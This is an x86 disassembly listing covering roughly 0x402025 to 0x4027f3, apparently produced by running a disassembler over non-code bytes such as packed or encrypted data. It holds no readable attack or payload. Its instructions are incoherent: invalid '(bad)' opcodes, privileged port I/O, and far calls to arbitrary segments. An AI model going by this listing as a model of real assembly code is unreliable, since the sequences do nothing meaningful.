  402025:	adc    dh,BYTE PTR [ecx]
  402027:	ss fcmovbe st,st(6)
  40202a:	add    DWORD PTR [ebx],0x7b
  40202d:	sahf   
  40202e:	pushf  
  40202f:	and    esi,DWORD PTR [edx+eax*2-0x6a37312f]
  402036:	push   edi
  402037:	push   ebx
  402038:	pushf  
  402039:	pop    ss
  40203a:	shl    BYTE PTR [edx+0x10],0x6a
  40203e:	pop    ebx
  40203f:	push   edi
  402040:	xchg   ebx,eax
  402041:	mov    edx,esp
  402043:	ja     0x4020a7
  402045:	push   0x45b5fa99
  40204a:	sbb    DWORD PTR [esi],0x2d
  40204d:	or     BYTE PTR [eax-0x50],0xb9
  402051:	hlt    
  402052:	scas   al,BYTE PTR es:[edi]
  402053:	and    eax,0xdd526e7d
  402058:	or     al,BYTE PTR [ecx-0x6d5865]
  40205e:	outs   dx,DWORD PTR ds:[esi]
  40205f:	pop    esp
  402060:	out    dx,eax
  402061:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402062:	pop    ecx
  402063:	pop    ebp
  402064:	(bad)  
  402065:	fst    QWORD PTR [ebx-0x440d0452]
  40206b:	cld    
  40206c:	into   
  40206d:	mov    dh,0x3a
  40206f:	sti    
  402070:	dec    ebp
  402071:	daa    
  402072:	loope  0x402000
  402074:	imul   edi,DWORD PTR [ebx],0xae9d6490
  40207a:	out    0x99,al
  40207c:	sub    al,0x99
  40207e:	xor    DWORD PTR [edx-0x4],edx
  402081:	sbb    ecx,DWORD PTR [eax-0x36]
  402084:	pop    ebx
  402085:	push   0x67
  402087:	or     BYTE PTR [ebp-0x3c7a69f6],bh
  40208d:	sub    ecx,ebp
  40208f:	push   ss
  402090:	inc    edi
  402091:	das    
  402092:	sub    DWORD PTR [ebx+0x43326816],0x48
  402099:	sub    ch,ah
  40209b:	retf   
  40209c:	outs   dx,BYTE PTR cs:[esi]
  40209e:	or     eax,0xea9489f0
  4020a3:	jmp    0x5d262db
  4020a8:	and    DWORD PTR ss:[edx+0x3229b21c],eax
  4020af:	jge    0x402082
  4020b1:	pop    ds
  4020b2:	pop    edi
  4020b3:	aas    
  4020b4:	fs pop ds
  4020b6:	rcl    esi,0xbc
  4020b9:	test   DWORD PTR [ecx+0x26],ebp
  4020bc:	sbb    ch,BYTE PTR es:[esi-0x50e91a29]
  4020c3:	std    
  4020c4:	call   0xbea1:0x453e003
  4020cb:	fwait
  4020cc:	mov    eax,ds:0x9d9d4893
  4020d1:	push   edx
  4020d2:	jp     0x402123
  4020d4:	jecxz  0x4020a6
  4020d6:	xchg   ecx,eax
  4020d7:	mov    eax,ds:0x6a09996d
  4020dc:	and    BYTE PTR [ebp-0x1880bf0],ah
  4020e2:	add    ebx,DWORD PTR [ecx]
  4020e4:	cwde   
  4020e5:	mov    eax,ds:0x1be9a749
  4020ea:	pop    ss
  4020eb:	mov    WORD PTR [ebx+eax*8],es
  4020ee:	inc    edi
  4020ef:	xor    BYTE PTR [ecx-0x32],al
  4020f2:	mov    esp,0x25b5511c
  4020f7:	aad    0x87
  4020f9:	pusha  
  4020fa:	dec    edx
  4020fc:	push   ebx
  4020fd:	neg    cl
  4020ff:	scas   eax,DWORD PTR es:[edi]
  402100:	pop    esp
  402101:	cmp    DWORD PTR [edi],ecx
  402103:	out    0x27,eax
  402105:	retf   0x35e3
  402108:	dec    ecx
  402109:	es jae 0x4020ef
  40210c:	mov    al,0x61
  40210e:	lods   al,BYTE PTR ds:[esi]
  40210f:	fs xchg edi,eax
  402111:	fdiv   st,st(2)
  402113:	sbb    DWORD PTR [ecx-0x1],eax
  402116:	mov    DWORD PTR [ecx],esp
  402118:	mov    ah,cl
  40211a:	jmp    0x7c3ba0d5
  40211f:	or     eax,0xfbd873c9
  402124:	xchg   ebx,eax
  402125:	scas   eax,DWORD PTR es:[edi]
  402126:	inc    ebp
  402127:	adc    BYTE PTR [edi+edi*8],dh
  40212a:	outs   dx,BYTE PTR ds:[esi]
  40212b:	std    
  40212c:	xor    bh,BYTE PTR [esi]
  40212e:	fld    TBYTE PTR ds:0x316f87db
  402134:	cld    
  402135:	jl     0x402101
  402137:	popf   
  402138:	mov    ecx,0x3df6c5ad
  40213d:	push   0x42e3f199
  402142:	jnp    0x4021bc
  402144:	(bad)  
  402145:	sub    DWORD PTR [ecx],edi
  402147:	mov    esi,0x7e2c23e4
  40214c:	push   edi
  40214d:	dec    edx
  40214e:	add    al,0x30
  402150:	rcr    DWORD PTR [ebp+0x17053961],0x2
  402157:	push   eax
  402158:	retf   0x962e
  40215b:	lea    eax,[edi]
  40215d:	loop   0x40212a
  40215f:	jg     0x402101
  402161:	pop    edi
  402162:	into   
  402163:	cmp    BYTE PTR [esi-0x2b5698eb],dl
  402169:	sub    bl,BYTE PTR [esi]
  40216b:	lods   eax,DWORD PTR ds:[esi]
  40216c:	into   
  40216d:	mov    eax,0x6b076ec5
  402172:	outs   dx,DWORD PTR ds:[esi]
  402173:	jno    0x4021bf
  402175:	inc    esi
  402176:	(bad)  
  402177:	cmp    ebx,DWORD PTR [ecx-0x7fe2dd7a]
  40217d:	mov    eax,cs:0x1197124
  402183:	xor    cl,BYTE PTR [ebx-0x27]
  402186:	frstor [esi-0x19]
  402189:	pop    ss
  40218a:	es icebp 
  40218c:	xor    bl,BYTE PTR [edi+eax*2+0x797a8ee8]
  402193:	lea    eax,[eax+0x74]
  402196:	sbb    DWORD PTR [edi],edi
  402198:	bound  eax,QWORD PTR ds:0x9a3b42a
  40219e:	inc    ebx
  40219f:	popf   
  4021a0:	(bad)  
  4021a1:	dec    edi
  4021a2:	(bad)  
  4021a3:	sbb    al,0x25
  4021a5:	in     al,0xa3
  4021a7:	mov    ah,0xf6
  4021a9:	rol    ah,cl
  4021ab:	mov    ss,WORD PTR [esi+0x2325a4f0]
  4021b1:	aaa    
  4021b2:	jl     0x40221d
  4021b4:	cdq    
  4021b5:	mov    ebx,0x8e18b80c
  4021ba:	inc    eax
  4021bb:	mov    ebp,DWORD PTR [ebx-0x36fb4fad]
  4021c1:	cmp    ah,BYTE PTR [edi+eiz*8+0x4]
  4021c5:	dec    edx
  4021c6:	nop
  4021c7:	bound  edx,QWORD PTR [esi+0x785a4fea]
  4021cd:	xor    BYTE PTR [ecx-0x42a584a1],dl
  4021d3:	test   BYTE PTR [eax],ah
  4021d5:	gs inc eax
  4021d7:	scas   eax,DWORD PTR es:[edi]
  4021d8:	mov    ebp,0xa3598989
  4021dd:	lea    eax,[ecx+0x4380137c]
  4021e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021e5:	mov    BYTE PTR [ebp-0x23],bh
  4021e8:	inc    eax
  4021e9:	push   esi
  4021ea:	in     al,dx
  4021eb:	pop    ebp
  4021ec:	aas    
  4021ed:	pushf  
  4021ee:	push   ss
  4021ef:	js     0x402211
  4021f1:	sbb    al,0xb8
  4021f3:	push   es
  4021f4:	js     0x40226b
  4021f6:	out    0x68,eax
  4021f8:	jecxz  0x402259
  4021fa:	adc    BYTE PTR [edi-0x7f],dh
  4021fd:	add    esp,DWORD PTR [edx]
  4021ff:	mov    ebx,0xb789827
  402204:	adc    eax,0xa2119e7
  402209:	mov    ebx,0x51a91443
  40220e:	and    ebx,ecx
  402210:	pop    edi
  402211:	call   0xd2d0:0xbb03f6cb
  402218:	and    ebp,edi
  40221a:	in     eax,0x65
  40221c:	dec    eax
  40221d:	(bad)  
  40221f:	adc    cl,ch
  402221:	and    dl,BYTE PTR [ebp+0x6d]
  402224:	fcomp  DWORD PTR [edx]
  402226:	inc    edi
  402227:	shl    DWORD PTR [ebx-0x3e],cl
  40222a:	jnp    0x4021ea
  40222c:	xchg   esi,edx
  40222e:	inc    eax
  40222f:	or     edx,DWORD PTR ds:0xdf4ed1b5
  402235:	push   0x4283381a
  40223a:	ret    
  40223b:	push   edi
  40223c:	ret    0x99d
  40223f:	imul   ebp,DWORD PTR [eax+0x2c],0xb4d201a8
  402246:	and    ah,BYTE PTR [ebx]
  402248:	inc    ebx
  402249:	clc    
  40224a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40224b:	jp     0x4021f0
  40224d:	xchg   edi,eax
  40224e:	mov    DWORD PTR [ebp-0x6c],0x188
  402255:	mov    DWORD PTR [ebp-0x70],0x5b3f
  40225c:	and    DWORD PTR ds:0x4228be,ecx
  402262:	jmp    0x4027ec
  402267:	loope  0x402242
  402269:	mov    bh,0x25
  40226b:	scas   eax,DWORD PTR es:[edi]
  40226c:	sbb    DWORD PTR [ecx+0x19],ebx
  40226f:	dec    edx
  402270:	retf   0x7262
  402273:	loop   0x40227c
  402275:	jmp    FWORD PTR [eax-0x5f]
  402278:	not    BYTE PTR [esi]
  40227a:	push   ss
  40227b:	cmp    eax,0x82161604
  402280:	sahf   
  402281:	outs   dx,BYTE PTR ds:[esi]
  402282:	adc    al,0xbd
  402284:	xchg   esi,eax
  402285:	pop    ebx
  402286:	dec    ecx
  402287:	repz pop eax
  402289:	mov    dh,0x6
  40228b:	lds    esp,FWORD PTR [ebx]
  40228d:	xlat   BYTE PTR ds:[ebx]
  40228e:	sbb    DWORD PTR [eax+0x35],0xffffffa9
  402292:	stos   BYTE PTR es:[edi],al
  402293:	inc    edi
  402294:	adc    BYTE PTR [esi+0x40],ch
  402297:	xchg   esi,eax
  402298:	dec    edx
  402299:	cmp    eax,DWORD PTR [edi+0x21]
  40229c:	xchg   ebp,eax
  40229d:	hlt    
  40229e:	or     DWORD PTR [eax-0x737ad410],ebp
  4022a4:	adc    al,0x7d
  4022a6:	icebp  
  4022a7:	jb     0x402303
  4022a9:	fsub   QWORD PTR [edi-0x6671d153]
  4022af:	test   BYTE PTR [ebx-0x2b77bd82],ah
  4022b5:	pop    ebx
  4022b6:	adc    DWORD PTR [ebp+0x12c54a56],esp
  4022bc:	or     ch,BYTE PTR es:[ebx+0x1674db7e]
  4022c3:	jo     0x4022e4
  4022c5:	fst    DWORD PTR [ebx+0x269f46fc]
  4022cb:	aad    0xeb
  4022cd:	push   0xa6e2b06f
  4022d2:	dec    ecx
  4022d3:	out    dx,eax
  4022d4:	jae    0x4022a5
  4022d6:	inc    esp
  4022d7:	push   esi
  4022d8:	xchg   ebp,eax
  4022d9:	enter  0x2061,0x2
  4022dd:	sub    eax,0xa23c0a14
  4022e2:	pop    ebp
  4022e3:	mov    al,ds:0xf5b53c37
  4022e8:	adc    ecx,DWORD PTR [edi+0x6]
  4022eb:	jp     0x402360
  4022ed:	pusha  
  4022ee:	add    ah,dl
  4022f0:	mov    cl,0x7a
  4022f2:	or     eax,0xb7898c26
  4022f7:	clc    
  4022f8:	ficom  DWORD PTR [esi-0x15]
  4022fb:	pop    ecx
  4022fc:	aad    0xf4
  4022fe:	sub    al,0x81
  402300:	mov    ebp,0xc74b2447
  402305:	mov    dl,0x9d
  402307:	add    al,0x34
  402309:	pop    esp
  40230a:	pushf  
  40230b:	mov    BYTE PTR [ebx-0x25318886],cl
  402311:	sti    
  402312:	sbb    ebp,DWORD PTR [edi-0x10]
  402315:	push   cs
  402316:	xor    eax,0x843d1a3c
  40231b:	pop    esi
  40231c:	test   al,0xc
  40231e:	mov    dl,0xab
  402320:	hlt    
  402321:	sbb    ecx,ecx
  402323:	mov    edx,DWORD PTR [edi-0x65234905]
  402329:	mov    ah,0x9a
  40232b:	mov    al,0xea
  40232d:	sbb    al,0xe0
  40232f:	int3   
  402330:	mov    cl,0x2c
  402332:	push   ds
  402333:	popf   
  402334:	push   esp
  402335:	dec    esi
  402336:	arpl   WORD PTR [edx+0x39bd8cf1],dx
  40233c:	push   cs
  40233d:	mov    dh,ah
  40233f:	mov    eax,DWORD PTR [edi+0x186fc316]
  402345:	pop    ss
  402346:	popf   
  402347:	out    dx,eax
  402348:	popa   
  402349:	pavgb  mm5,QWORD PTR [esi-0x46]
  40234d:	fidiv  WORD PTR [ecx+ebp*1+0x35991f08]
  402354:	push   esp
  402355:	mov    ch,0x39
  402357:	fnsave [ecx+0x39]
  40235a:	lods   eax,DWORD PTR ds:[esi]
  40235b:	or     al,0x88
  40235d:	scas   eax,DWORD PTR es:[edi]
  40235e:	push   esi
  40235f:	icebp  
  402360:	mov    cl,0x6b
  402362:	loopne 0x4022f5
  402364:	cs mov ebp,0xaa94e8fc
  40236a:	arpl   dx,sp
  40236c:	call   0x71d2:0x542fa942
  402373:	cld    
  402374:	jmp    0xf511:0xf1946d18
  40237b:	sub    DWORD PTR [ebp-0x73],ebx
  40237e:	mov    bl,0x8b
  402380:	mov    BYTE PTR [ebx],ch
  402382:	xor    eax,0x5544e3c2
  402387:	aam    0x3a
  402389:	jmp    0x40231b
  40238b:	jp     0x402404
  40238d:	cmc    
  40238e:	icebp  
  40238f:	push   cs
  402390:	out    0x13,al
  402392:	inc    ebp
  402393:	xchg   ebp,eax
  402394:	adc    al,0x3f
  402396:	xchg   edx,eax
  402397:	add    ch,BYTE PTR [ecx+0x1ef5cc42]
  40239d:	mov    al,0x61
  40239f:	scas   al,BYTE PTR es:[edi]
  4023a0:	mov    DWORD PTR [edx-0x9],edi
  4023a3:	mov    ecx,0x2b16816a
  4023a8:	cmp    esi,eax
  4023aa:	push   edx
  4023ab:	lods   al,BYTE PTR ds:[esi]
  4023ac:	or     ecx,DWORD PTR [edi]
  4023ae:	or     DWORD PTR [edi+0xf3d0b0a],0x7167fdea
  4023b8:	pop    es
  4023b9:	aam    0xaf
  4023bb:	push   0xaf8451c8
  4023c0:	enter  0xab8b,0xda
  4023c4:	in     al,dx
  4023c5:	mov    edi,0xe31cebba
  4023ca:	mov    BYTE PTR [esi-0x5],bl
  4023cd:	adc    ecx,DWORD PTR [eax]
  4023cf:	clc    
  4023d0:	mov    esp,0x32c78b39
  4023d5:	jo     0x4023d9
  4023d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4023d8:	inc    ecx
  4023d9:	mov    ebx,0xdddda335
  4023de:	cmc    
  4023df:	xchg   BYTE PTR [edi-0x32],dh
  4023e2:	cs mov ebx,0xa345cd80
  4023e8:	pop    eax
  4023e9:	xor    dh,BYTE PTR [eax+0x25]
  4023ec:	sub    DWORD PTR [ecx+0x74],ecx
  4023ef:	jns    0x40245b
  4023f1:	mov    eax,0x28d31dd8
  4023f6:	xor    edi,eax
  4023f8:	popf   
  4023f9:	outs   dx,DWORD PTR ds:[esi]
  4023fa:	imul   edi,DWORD PTR [edx-0x61955c7e],0xeb0da013
  402404:	push   edi
  402405:	dec    esp
  402406:	or     al,0x7c
  402408:	sahf   
  402409:	adc    al,al
  40240b:	iret   
  40240c:	pop    edi
  40240d:	inc    ebp
  40240e:	icebp  
  40240f:	xchg   edi,eax
  402410:	mov    ds:0x4d9ee345,eax
  402415:	fdiv   DWORD PTR [ecx]
  402417:	outs   dx,BYTE PTR ds:[esi]
  402418:	jecxz  0x40248b
  40241a:	xchg   BYTE PTR [edi],ah
  40241c:	pop    ds
  40241d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40241e:	push   ebx
  40241f:	dec    edx
  402420:	dec    ecx
  402421:	push   0xffffff96
  402423:	into   
  402424:	sbb    esi,DWORD PTR [ecx+ebx*4]
  402427:	xchg   ebp,eax
  402428:	outs   dx,DWORD PTR ds:[esi]
  402429:	pop    esi
  40242a:	outs   dx,DWORD PTR ds:[esi]
  40242b:	and    eax,0x2bd286e4
  402430:	jbe    0x402422
  402432:	loope  0x402495
  402434:	adc    esi,ebp
  402436:	or     eax,0x60ed81a4
  40243b:	jb     0x4023d2
  40243d:	ret    0x6079
  402440:	(bad)  
  402441:	push   esi
  402442:	and    ecx,DWORD PTR [ecx+0x68]
  402445:	add    al,0xfd
  402447:	addr16 add ah,ch
  40244a:	cmpxchg edi,ebx
  40244d:	sbb    eax,0x331373ae
  402452:	sbb    edi,DWORD PTR [edx+esi*4]
  402455:	or     eax,0xa88579fc
  40245a:	pushf  
  40245b:	push   ds
  40245c:	stc    
  40245d:	fist   WORD PTR [ecx-0x3fa9a480]
  402463:	iret   
  402464:	in     al,0xed
  402466:	daa    
  402467:	xlat   BYTE PTR ds:[ebx]
  402468:	adc    BYTE PTR [ecx-0x4f],bl
  40246b:	inc    ebp
  40246c:	mov    eax,0xf0deb71a
  402471:	mov    eax,ds:0x352d1e6e
  402476:	and    edx,DWORD PTR [ebx+0x276fae3d]
  40247c:	call   0x7340:0xc0af7c91
  402483:	jbe    0x4024fe
  402485:	pop    eax
  402486:	xchg   esi,eax
  402487:	mov    ebp,DWORD PTR [ecx]
  402489:	std    
  40248a:	add    DWORD PTR [eax+0x4a],esi
  40248d:	push   edx
  40248e:	shl    DWORD PTR [eax-0x151c9e31],1
  402494:	or     BYTE PTR [esi],bh
  402496:	test   dh,dh
  402498:	test   eax,0xcf0d7c3e
  40249d:	mov    gs,eax
  40249f:	mov    edx,0xdb02d0a9
  4024a4:	adc    bl,bh
  4024a6:	mov    bl,0xa4
  4024a8:	cli    
  4024a9:	and    al,0x7d
  4024ab:	ja     0x4024b9
  4024ad:	jbe    0x40251f
  4024af:	cmp    eax,0xa7ba50d1
  4024b4:	add    esi,edi
  4024b6:	sub    esi,DWORD PTR [ecx+0x1b]
  4024b9:	add    al,0xf7
  4024bb:	xchg   esp,eax
  4024bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024bd:	push   ecx
  4024be:	or     eax,0xe9b3fdd8
  4024c3:	test   DWORD PTR [esi+0x6b],esp
  4024c6:	aam    0x94
  4024c8:	mov    esi,0xb4894635
  4024cd:	(bad)  
  4024ce:	pop    eax
  4024cf:	xchg   edx,eax
  4024d0:	sti    
  4024d1:	add    bl,BYTE PTR [ebp+0x4fc3ef67]
  4024d7:	push   ecx
  4024d8:	(bad)  
  4024d9:	add    dl,BYTE PTR ds:0x97a284ef
  4024df:	add    al,BYTE PTR [esi]
  4024e1:	dec    ebp
  4024e2:	jge    0x40251c
  4024e4:	ds push 0x49
  4024e7:	adc    al,0x69
  4024e9:	sar    DWORD PTR [esi+0x38],1
  4024ec:	or     eax,0xab4f49af
  4024f1:	xor    al,0x24
  4024f3:	imul   BYTE PTR [esi]
  4024f5:	sahf   
  4024f6:	ret    0xdaf2
  4024f9:	dec    esi
  4024fa:	fdiv   st(2),st
  4024fc:	inc    ebx
  4024fd:	int3   
  4024fe:	xchg   ecx,eax
  4024ff:	addr16 mov ebx,0xb66bc998
  402505:	mov    bl,0x4c
  402507:	push   es
  402508:	fucomi st,st(3)
  40250a:	inc    edx
  40250b:	outs   dx,DWORD PTR ds:[esi]
  40250c:	mov    ds:0xd2e5ae35,al
  402511:	sar    ch,0xd3
  402514:	dec    edi
  402515:	mov    WORD PTR [ecx],ds
  402517:	lods   al,BYTE PTR ds:[esi]
  402518:	inc    esp
  402519:	xor    eax,0xd31ac426
  40251e:	std    
  40251f:	loope  0x4024e9
  402521:	test   DWORD PTR [esi],ebp
  402523:	xor    al,0x87
  402525:	and    esp,ebx
  402527:	stc    
  402528:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402529:	fcmovnbe st,st(2)
  40252b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40252c:	(bad)  
  40252d:	jmp    0x40255b
  40252f:	or     WORD PTR [esi+edi*4-0x20],cx
  402534:	push   esp
  402535:	sub    edi,DWORD PTR [ecx]
  402537:	sar    DWORD PTR [ebp+0x31],cl
  40253a:	imul   edi,edx,0x8
  40253d:	or     DWORD PTR [ecx],eax
  40253f:	(bad)  [eax-0x19]
  402542:	lea    ebp,[edx-0x32]
  402545:	push   ebp
  402546:	fwait
  402547:	int3   
  402548:	cmp    DWORD PTR [eax+0x3d],eax
  40254b:	xor    esi,esi
  40254d:	mov    bh,0xfe
  40254f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402550:	dec    eax
  402551:	loope  0x4024ee
  402553:	adc    edx,esp
  402555:	push   0xac4363e7
  40255a:	ficomp DWORD PTR [ebx]
  40255c:	ins    BYTE PTR es:[edi],dx
  40255d:	jno    0x40253f
  40255f:	scas   al,BYTE PTR es:[edi]
  402560:	retf   0x3aac
  402563:	mov    cl,0xd6
  402565:	pop    ss
  402566:	lahf   
  402567:	mov    BYTE PTR [edx-0x6f],bl
  40256a:	adc    dl,bh
  40256c:	sbb    esp,DWORD PTR [edi+0x47561e2b]
  402572:	adc    al,0xbf
  402574:	jl     0x4025a9
  402576:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402577:	rcr    dh,cl
  402579:	push   ebp
  40257a:	outs   dx,BYTE PTR ds:[esi]
  40257b:	addr16 int3 
  40257d:	outs   dx,BYTE PTR ds:[esi]
  40257e:	icebp  
  40257f:	shl    BYTE PTR [ecx-0x56],1
  402582:	aad    0x12
  402584:	mov    ch,0x24
  402586:	mov    esi,0x41ccc9ba
  40258b:	sbb    ebx,0x5f
  40258e:	fnsave ds:0x80b2cf0e
  402594:	arpl   WORD PTR [esi],dx
  402596:	xchg   esi,eax
  402597:	add    al,0xcb
  402599:	loope  0x4025f6
  40259b:	sbb    DWORD PTR [edi+0x23],edx
  40259e:	in     al,dx
  40259f:	cmp    al,0x54
  4025a1:	and    al,0x4b
  4025a3:	xchg   BYTE PTR [edi+0x50],bh
  4025a6:	xchg   DWORD PTR [ecx+edx*2+0x5e73e56],esi
  4025ad:	dec    esi
  4025ae:	mov    eax,0xfc306fb6
  4025b3:	push   cs
  4025b4:	mov    bl,0x3
  4025b6:	inc    edi
  4025b7:	mov    esi,0x1cad0a66
  4025bc:	push   cs
  4025bd:	xor    ebp,DWORD PTR [edx*8+0x5f6f4765]
  4025c4:	sbb    ecx,DWORD PTR [esi-0x55]
  4025c7:	push   cs
  4025c8:	jmp    0x1e5:0x2f5ac4d3
  4025cf:	ds mov bh,0x3b
  4025d2:	retf   
  4025d3:	fs push ecx
  4025d5:	lds    ebp,FWORD PTR [ebx-0x39c00528]
  4025db:	test   eax,0x6d39643c
  4025e0:	test   DWORD PTR [esi*1-0x308f2c94],0x3ce77759
  4025eb:	or     dl,BYTE PTR [ebx+edi*4]
  4025ee:	adc    BYTE PTR [edi+esi*1-0x16],dh
  4025f2:	fmul   st(3),st
  4025f4:	(bad)  
  4025f5:	mov    eax,ds:0xf9b051e
  4025fa:	push   0xffffffd5
  4025fc:	std    
  4025fd:	and    DWORD PTR [ecx+0x56],eax
  402600:	fiadd  WORD PTR [edi+ebx*4-0x6b200ca5]
  402607:	mov    esp,gs
  402609:	aas    
  40260a:	test   DWORD PTR [ebp+0x12],0x37cc709a
  402611:	mov    cl,0x1e
  402613:	xor    DWORD PTR [ecx],edx
  402615:	dec    edx
  402616:	jnp    0x4025ed
  402618:	imul   esi,ebp,0x30
  40261b:	fimul  WORD PTR [ebp+0x38]
  40261e:	mov    eax,0x785e78e9
  402623:	push   ds
  402624:	int    0xe
  402626:	dec    eax
  402627:	jle    0x402605
  402629:	out    dx,al
  40262a:	enter  0xc099,0x46
  40262e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40262f:	adc    esp,ebp
  402631:	js     0x4025fe
  402633:	mov    edx,0x2a0acbe
  402638:	inc    ebp
  402639:	sbb    BYTE PTR [esi-0x103c7a51],cl
  40263f:	cmp    ebp,DWORD PTR [edx]
  402641:	outs   dx,DWORD PTR ds:[esi]
  402642:	and    ebp,ebp
  402644:	fld    TBYTE PTR [eax-0x4d430897]
  40264a:	cmp    al,0xa0
  40264c:	in     al,0xb7
  40264e:	mov    ds,WORD PTR [esi-0x6edbed4]
  402654:	jae    0x402694
  402656:	retf   0x55de
  402659:	inc    edi
  40265a:	inc    ebx
  40265b:	cld    
  40265c:	or     eax,0x2abdeb62
  402661:	mov    dh,0x1b
  402663:	int3   
  402664:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402665:	push   edi
  402666:	jns    0x40267d
  402668:	bound  edx,QWORD PTR [ecx]
  40266a:	imul   eax,DWORD PTR [ecx-0x41489390],0xffffffcd
  402671:	pop    es
  402672:	or     DWORD PTR [esi-0x3e],ebp
  402675:	mov    al,0x3b
  402677:	sub    eax,0x3eee6221
  40267c:	shl    edi,0x47
  40267f:	push   es
  402680:	shl    DWORD PTR [ebp-0x25],1
  402683:	pusha  
  402684:	cmc    
  402685:	mov    ecx,0x2ebeb56c
  40268a:	ret    0x3b02
  40268d:	or     ebx,edx
  40268f:	clc    
  402690:	enter  0xdffd,0xbb
  402694:	daa    
  402695:	nop
  402696:	jbe    0x4026f6
  402698:	sbb    al,0xfa
  40269a:	aad    0xdf
  40269c:	or     DWORD PTR [edi+0x9],ebx
  40269f:	push   ebp
  4026a0:	and    BYTE PTR [ebx+0x47a410dc],cl
  4026a6:	xchg   edx,eax
  4026a7:	popa   
  4026a8:	je     0x402683
  4026aa:	xor    eax,0x4eae383f
  4026af:	fstp   TBYTE PTR [esi-0x67]
  4026b2:	jl     0x402667
  4026b4:	fiadd  DWORD PTR [esi]
  4026b6:	jl     0x4026bd
  4026b8:	dec    ebx
  4026b9:	mov    ds:0xdab9d68d,eax
  4026be:	mov    al,BYTE PTR [ecx+0x78]
  4026c1:	sbb    BYTE PTR [ebx+0x44],bh
  4026c4:	lods   al,BYTE PTR ds:[esi]
  4026c5:	jmp    DWORD PTR [ecx+0x3a]
  4026c8:	pop    ebx
  4026c9:	adc    DWORD PTR [edi],ecx
  4026cb:	sbb    ebx,esp
  4026cd:	mul    BYTE PTR [ebp+edx*1+0x48]
  4026d1:	adc    esp,DWORD PTR [eax+0x25be0dc1]
  4026d7:	mov    BYTE PTR [ecx+0x5e5b1946],dl
  4026dd:	jns    0x40273a
  4026df:	cmc    
  4026e0:	adc    BYTE PTR [ebp-0x1941cdea],0x68
  4026e7:	mov    WORD PTR ds:0x24225311,?
  4026ed:	and    bl,BYTE PTR [ecx+0x6]
  4026f0:	pop    es
  4026f1:	or     DWORD PTR [ebx],0xb929d356
  4026f7:	inc    edi
  4026f8:	aas    
  4026f9:	(bad)  
  4026fa:	mov    dh,0x1a
  4026fc:	sub    al,0xa2
  4026fe:	into   
  4026ff:	mov    ebp,cs
  402701:	jne    0x40275f
  402703:	(bad)
  402707:	jmp    0xe7283b48
  40270c:	push   ss
  40270d:	sbb    dl,BYTE PTR [ebx-0x7cfe900a]
  402713:	cdq    
  402714:	or     al,0x83
  402716:	or     al,0x21
  402718:	xor    BYTE PTR [esi-0x25],ch
  40271b:	into   
  40271c:	in     eax,0x5f
  40271e:	popf   
  40271f:	scas   eax,DWORD PTR es:[edi]
  402720:	test   al,0xb8
  402722:	mov    BYTE PTR [eax],dh
  402724:	push   esp
  402725:	dec    esp
  402726:	xor    eax,0x726b0679
  40272b:	push   0x5e
  40272d:	cs es xor edx,edx
  402731:	adc    ecx,DWORD PTR [ecx]
  402733:	ja     0x402794
  402735:	fdivp  st(7),st
  402737:	scas   eax,DWORD PTR es:[edi]
  402738:	adc    ch,BYTE PTR [edi-0x58b70d73]
  40273e:	xor    edi,DWORD PTR [eax+ebx*4+0x7824d335]
  402745:	mov    esp,DWORD PTR [edx-0x4f631a4b]
  40274b:	inc    DWORD PTR [ebp+0x39264e63]
  402751:	mov    esp,0xc2a7bd11
  402756:	dec    edx
  402757:	stos   BYTE PTR es:[edi],al
  402758:	imul   ebx,DWORD PTR [ecx],0x551709f3
  40275e:	test   DWORD PTR [edi],esp
  402760:	fstp   TBYTE PTR [ecx-0x15]
  402763:	aas    
  402764:	cmp    ebp,DWORD PTR [ebp+0x31]
  402767:	(bad)  
  402768:	daa    
  402769:	push   ecx
  40276a:	cs mov esi,0x93dbd8d0
  402770:	mov    cl,0xa
  402772:	xor    bl,BYTE PTR [ecx-0x2a54a150]
  402778:	inc    eax
  402779:	mov    edi,0xb73c250c
  40277e:	cli    
  40277f:	in     al,dx
  402780:	pushf  
  402781:	or     eax,0xd82d3f5a
  402786:	popf   
  402787:	fstp   DWORD PTR [ebx-0x44]
  40278a:	cmp    al,0x35
  40278c:	mov    edi,0xacd585fd
  402791:	inc    ebp
  402792:	sbb    BYTE PTR [edx-0x65],0x97
  402796:	jp     0x402792
  402798:	shl    DWORD PTR ds:0x863e3c94,1
  40279e:	add    BYTE PTR [ecx+edx*8+0x22],0x79
  4027a3:	arpl   WORD PTR [esp+edi*2-0x606e57a6],cx
  4027aa:	and    al,0x1c
  4027ac:	jmp    0x40276a
  4027ae:	pop    edi
  4027af:	xchg   edx,eax
  4027b0:	lods   eax,DWORD PTR ds:[esi]
  4027b1:	ds push es
  4027b3:	cmc    
  4027b4:	les    esp,FWORD PTR [edx+edx*1-0x72]
  4027b8:	adc    DWORD PTR [edi],edx
  4027ba:	or     al,0x96
  4027bc:	fsub   st,st(6)
  4027be:	pusha  
  4027bf:	sub    al,0xe7
  4027c1:	xchg   edi,eax
  4027c2:	push   edi
  4027c3:	pushf  
  4027c4:	jb     0x402805
  4027c6:	call   0xb812:0x17d01b9c
  4027cd:	test   DWORD PTR [ebp+0x789436c3],ebx
  4027d3:	lods   eax,DWORD PTR ds:[esi]
  4027d4:	push   cs
  4027d5:	fisubr WORD PTR [ebx+0x14]
  4027d8:	adc    dl,BYTE PTR [edi-0x3410120]
  4027de:	jbe    0x4027a2
  4027e0:	aad    0x9f
  4027e2:	call   FWORD PTR [ebp-0x44]
  4027e5:	pop    eax
  4027e6:	sahf   
  4027e7:	dec    esi
  4027e8:	bound  ebp,QWORD PTR [ecx]
  4027ea:	fidivr DWORD PTR [edi+eax*8]
  4027ed:	inc    ebp
  4027ee:	xchg   esp,eax
  4027ef:	sbb    DWORD PTR [edx],esi
  4027f1:	add    BYTE PTR [eax],al
  4027f3:	mov    DWORD PTR [ebp-0x70],0x231c
